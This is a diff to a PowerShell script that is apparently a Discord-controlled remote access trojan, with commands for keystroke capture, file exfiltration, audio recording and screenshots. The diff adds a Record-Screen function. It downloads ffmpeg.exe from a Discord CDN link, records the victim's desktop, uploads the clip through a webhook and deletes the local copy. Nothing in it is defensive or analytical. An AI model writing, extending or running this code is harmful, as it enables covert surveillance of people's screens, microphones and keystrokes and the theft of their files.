@@ -64,6 +64,7 @@ Toggle-Errors    : Toggle error messages to chat
 Folder-Tree    : Gets Dir tree and sends it zipped
 SpeechToText  : Send audio transcript to Discord
 Record-Audio  : Record microphone to Discord
+Record-Screen  : Record Screen to Discord             
 Screenshot   : Sends a screenshot of the desktop
 Key-Capture    : Capture Keystrokes and send
 Exfiltrate   : Sends files (see 'Extra-Info' for more)
@@ -119,9 +120,9 @@ This Eg. will scan 192.168.1.1 to 192.168.1.254
 ===============  Message Example ===============
 ( PS`> Message 'Your Message Here!' )
 
-================== Record-Audio Example =================
+================== Record Examples =================
 ( Record-Audio -t 100 ) number of seconds to record     
-
+( Record-Screen -t 100 ) number of seconds to record     
 =============================================="
 Post-Message | Out-Null
 }
@@ -192,6 +193,24 @@ $id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output
 $filePath = "$env:Temp\AudioClip.mp3"
 if ($t.Length -eq 0){$t = 10}
 .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $filePath
+Post-File
+sleep 1
+rm -Path $filePath -Force
+}
+
+Function Record-Screen{
+param ([int[]]$t)
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+$Path = "$env:Temp\ffmpeg.exe"
+If (!(Test-Path $Path)){  
+$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
+iwr -Uri $url -OutFile $Path
+}
+sleep 1
+$filePath = "$env:Temp\ScreenClip.mkv"
+if ($t.Length -eq 0){$t = 10}
+.$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $filePath
 Post-File
 sleep 1
 rm -Path $filePath -Force
